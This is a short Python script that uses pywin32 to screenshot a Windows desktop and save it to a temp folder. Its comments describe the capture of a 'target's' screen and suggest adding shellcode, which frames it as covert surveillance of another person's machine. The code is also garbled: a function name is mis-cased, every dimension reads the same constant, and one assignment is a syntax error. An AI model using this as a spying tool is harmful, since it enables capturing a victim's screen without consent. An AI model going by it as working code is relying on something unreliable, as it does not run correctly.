#This only works if you can get to the files... Perhaps adding a shellcode action?!?

import win32gui
import win32ui
import win32con
import win32api
#Grab a handel to the main
hdesktop = win32gui.GetDesktopWindow()

#Determine the size of target's window in pixel
width = win32api.GetsystemMetrics(win32con.SM_CXVIRTUALSCREEN)
height = win32api.GetsystemMetrics(win32con.SM_CXVIRTUALSCREEN)
left = win32api.GetsystemMetrics(win32con.SM_CXVIRTUALSCREEN)
top = win32api.GetsystemMetrics(win32con.SM_CXVIRTUALSCREEN)

#Create a device contex
desktop_dc m= win32gui.GetWindowDC(hdesktop)
img_dc = win32ui.CreateDCFromHandle(desktop_dc)
#Create a memory based device contex
mem_dc = img_dc.CreateCompatibleDC()

#Create a bitmap object
screenshot = win32ui.CreateBitmap()
screenshot.CreateCompatibleBitmap(img_dc, width, height)
mem_dc.SelectObject(screenshot)

#Copy the screen into our memory device contex
mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)	  
#Save the bitmap to a file
screenshot.SaveBitmapFile(mem_dc,'c:\\WINDOWS\\Temp\\screenshot.bmp')
#free our object 
mem_dc.DeleteDC()
win32gui.DeleteObject(screenshot.GetHandle())
